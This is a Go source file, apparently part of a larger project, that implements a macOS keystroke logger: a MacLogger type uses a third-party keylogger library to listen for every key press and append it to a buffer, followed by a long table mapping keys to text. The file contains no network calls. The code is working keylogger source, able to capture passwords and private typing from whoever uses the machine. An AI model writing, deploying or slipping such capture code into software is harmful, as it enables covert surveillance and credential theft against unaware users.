package mac

import (
	"bytes"
	"log"

	"github.com/KeisukeYamashita/go-macos-keylogger/pkg/keyboard"
	"github.com/KeisukeYamashita/go-macos-keylogger/pkg/keylogger"
)

type MacLogger struct {
}

func NewMacLogger() *MacLogger {
	return &MacLogger{}
}

func (l *MacLogger) CaptureKeyboardKeys(logBuffer *bytes.Buffer) {
	kl, err := keylogger.New()
	if err != nil {
		log.Fatal("No keyboard found...")
	}

	f := func(key keyboard.Key, state keyboard.State) {
		if state == keyboard.Down {
			logBuffer.WriteString(convertKey(key))
		}
	}

	kl.Listen(f)

}

var KeyMapping = map[keyboard.Key]string{
	// Alphabet keys
	keyboard.A: "a",
	keyboard.B: "b",
	keyboard.C: "c",
	keyboard.D: "d",
	keyboard.E: "e",
	keyboard.F: "f",
	keyboard.G: "g",
	keyboard.H: "h",
	keyboard.I: "i",
	keyboard.J: "j",
	keyboard.K: "k",
	keyboard.L: "l",
	keyboard.M: "m",
	keyboard.N: "n",
	keyboard.O: "o",
	keyboard.P: "p",
	keyboard.Q: "q",
	keyboard.R: "r",
	keyboard.S: "s",
	keyboard.T: "t",
	keyboard.U: "u",
	keyboard.V: "v",
	keyboard.W: "w",
	keyboard.X: "x",
	keyboard.Y: "y",
	keyboard.Z: "z",

	// Function keys
	keyboard.F1:  "F1",
	keyboard.F2:  "F2",
	keyboard.F3:  "F3",
	keyboard.F4:  "F4",
	keyboard.F5:  "F5",
	keyboard.F6:  "F6",
	keyboard.F7:  "F7",
	keyboard.F8:  "F8",
	keyboard.F9:  "F9",
	keyboard.F10: "F10",
	keyboard.F11: "F11",
	keyboard.F12: "F12",
	keyboard.F13: "F13",
	keyboard.F14: "F14",
	keyboard.F15: "F15",
	keyboard.F16: "F16",
	keyboard.F17: "F17",
	keyboard.F18: "F18",
	keyboard.F19: "F19",
	keyboard.F20: "F20",
	keyboard.F21: "F21",
	keyboard.F22: "F22",
	keyboard.F23: "F23",
	keyboard.F24: "F24",
	keyboard.F25: "F25",

	// Operations
	keyboard.NumMultiply: "*",
	keyboard.NumDivide:   "/",
	keyboard.NumAdd:      "+",
	keyboard.NumSubtract: "-",

	// Number keys
	keyboard.Zero:  "0",
	keyboard.One:   "1",
	keyboard.Two:   "2",
	keyboard.Three: "3",
	keyboard.Four:  "4",
	keyboard.Five:  "5",
	keyboard.Six:   "6",
	keyboard.Seven: "7",
	keyboard.Eight: "8",
	keyboard.Nine:  "9",

	// Number Pad
	keyboard.NumLock:  "NumLock",
	keyboard.NumZero:  "0",
	keyboard.NumOne:   "1",
	keyboard.NumTwo:   "2",
	keyboard.NumThree: "3",
	keyboard.NumFour:  "4",
	keyboard.NumFive:  "5",
	keyboard.NumSix:   "6",
	keyboard.NumSeven: "7",
	keyboard.NumEight: "8",
	keyboard.NumNine:  "9",

	// Special keys
	keyboard.Enter:        "Enter",
	keyboard.Tab:          "Tab",
	keyboard.Space:        " ",
	keyboard.NumDecimal:   ".",
	keyboard.NumComma:     ",",
	keyboard.NumEnter:     "NumEnter",
	keyboard.Tilde:        "~",
	keyboard.Dash:         "-",
	keyboard.Equals:       "=",
	keyboard.Semicolon:    ";",
	keyboard.Apostrophe:   "'",
	keyboard.RightAlt:     "RightAlt",
	keyboard.LeftAlt:      "LeftAlt",
	keyboard.RightCtrl:    "RightCtrl",
	keyboard.LeftCtrl:     "LeftCtrl",
	keyboard.RightShift:   "RightShift",
	keyboard.LeftShift:    "LeftShift",
	keyboard.RightSuper:   "RightSuper",
	keyboard.LeftSuper:    "LeftSuper",
	keyboard.RightBracket: "]",
	keyboard.LeftBracket:  "[",
	keyboard.BackSlash:    "\\",
	keyboard.ForwardSlash: "/",
	keyboard.Delete:       "Delete",

	// Arrow Keys
	keyboard.ArrowLeft:  "ArrowLeft",
	keyboard.ArrowUp:    "ArrowUp",
	keyboard.ArrowRight: "ArrowRight",
	keyboard.ArrowDown:  "ArrowDown",
}

func convertKey(key keyboard.Key) string {
	return KeyMapping[key]
}
